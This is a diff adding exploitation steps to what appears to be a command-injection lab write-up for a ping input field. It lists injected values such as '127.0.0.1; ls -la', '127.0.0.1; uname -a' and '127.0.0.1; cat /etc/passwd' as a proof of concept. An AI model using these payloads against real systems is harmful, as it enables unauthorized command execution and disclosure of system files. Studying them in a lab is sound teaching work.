@@ -6,3 +6,27 @@
 ## ⚡ Exploitation Steps
 
 ### 1. Normal Input
+
+Input: 127.0.0.1
+Command: ping 127.0.0.1
+Result: Normal ping output
+
+
+### 2. Command Injection
+
+Input: 127.0.0.1; ls
+Command: ping 127.0.0.1; ls
+Result: Ping output + Directory listing
+
+
+### 3. Proof of Concept
+```bash
+# List files in current directory
+127.0.0.1; ls -la
+
+# View system information
+127.0.0.1; uname -a
+
+# Read sensitive files
+127.0.0.1; cat /etc/passwd
+
